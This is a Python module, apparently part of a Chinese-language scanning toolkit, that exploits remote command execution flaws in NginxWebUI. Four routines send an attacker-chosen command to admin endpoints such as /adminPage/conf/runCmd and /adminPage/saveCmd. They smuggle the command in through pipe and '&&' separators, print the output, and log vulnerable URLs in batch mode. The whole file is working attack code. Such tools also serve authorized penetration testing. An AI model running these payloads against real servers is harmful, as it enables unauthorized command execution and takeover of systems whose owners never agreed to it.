#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests
import urllib3,re
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
urllib3.disable_warnings()


class NginxRceScan1():
    def poc3(self,url,cmd):
        res_url = url + f'/adminPage/conf/reload?nginxExe={cmd}%20%7C'
        response = requests.get(res_url,headers=self.headers,verify=self.verify,proxies=self.proexis)
        if 'success' in response.text:
            OutPrintInfoSuc("NignxUI",f"存在漏洞 {res_url}")
            if self.batch:
                with open("./result/nginx_rce.txt","a") as w:
                    w.write(f"{res_url}\n")
            return True
        return False
    def poc2(self,url,cmd):
        head = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'Origin': 'chrome-extension://ieoejemkppmjcdfbnfphhpbfmallhfnc',
            'Accept-Encoding': 'gzip, deflate Accept-Language: zh-CN,zh;q=0.9',
            'Cookie': 'SOLONID=1788f71299dc4608a355ff347bf429fa'
        }
        res_url = url + '/adminPage/conf/check'
        data = f'nginxExe={cmd}%20%7C&json=%7B%22nginxContent%22%3A%22TES%22%2C%22subContent%22%3A%5B%22A%22%5D%2C%22subName%22%3A%5B%22A%22%5D%7D&nginxPath=C%3A%5CUsers'
        response = requests.post(res_url,headers=head,data=data,verify=self.verify,proxies=self.proexis)
        if 'success' in response.text:
            OutPrintInfoSuc("NignxUI",f"存在漏洞 {res_url}")
            if self.batch:
                with open("./result/nginx_rce.txt","a") as w:
                    w.write(f"{res_url}\n")
            return True

        return False

    def poc1(self,url,cmd):
        res_url = url + f'/adminPage/conf/runCmd?cmd={cmd}%26%26echo%20nginx'
        try:
            response = requests.get(res_url,headers=self.headers,verify=self.verify,proxies=self.proexis)
            res = re.findall('<br>运行失败<br>(.*?)<br>nginx<br>"}', response.text)

            if res != '':
                OutPrintInfoSuc("NignxUI",f"存在漏洞 {res_url}")
                if not self.batch:
                    OutPrintInfo("NignxUI",res[0])
                else:
                    with open("./result/nginx_rce.txt","a") as w:
                        w.write(f"{res_url}\n")
                return True

            return False
        except Exception:
            pass
    def poc4(self,url,cmd):
        res_url = url + f'/adminPage/saveCmd?nginxExe={cmd}%20%7c&nginxPath=a&nginxDir=a'
        response = requests.get(res_url,headers=self.headers,verify=self.verify,proxies=self.proexis)
        if not self.batch:
            OutPrintInfo("NignxUI",response.text)
            OutPrintInfo("NignxUI",'开始第二次请求执行命令')
        two_url = url + '/adminPage/conf/checkBase'
        response2 = requests.get(two_url,headers=self.headers,verify=self.verify,proxies=self.proexis)
        if response2.status_code == 200:
            OutPrintInfo("NignxUI",f"存在漏洞 {res_url}")
            if self.batch:
                with open("./result/nginx_rce.txt","a") as w:
                    w.write(f"{res_url}\n")
            return True
        return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        cmd = target["cmd"]
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]

        s, self.proexis = ReqSet(header=header, proxy=proxy, bwork=self.batch)


        if not self.batch:
            OutPrintInfo("NignxUI", '开始检测NginxWebUI-RCE')
        self.headers = {
            'Host': url.split('://')[-1],
            'User-Agent': header,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Upgrade-Insecure-Requests': '1',
        }
        if not self.batch:
            OutPrintInfo("NignxUI",'开始进行执行Poc1......')
        if not self.poc1(url,cmd):
            if not self.batch:
                OutPrintInfo("NignxUI",'开始进行执行Poc2......')
        else:
            return
        if not self.poc2(url,cmd):
            if not self.batch:
                OutPrintInfo("NignxUI",'开始进行执行Poc3......')
        else:
            return
        if not self.poc3(url,cmd):
            if not self.batch:
                OutPrintInfo("NignxUI",'开始进行执行Poc4......')
        else:
            return
        if not self.poc4(url,cmd):
            if not self.batch:
                OutPrintInfo("NignxUI",'目标未能发现漏洞')
        if not self.batch:
            OutPrintInfo("NignxUI",'NginxWebUI-RCE检测结束')
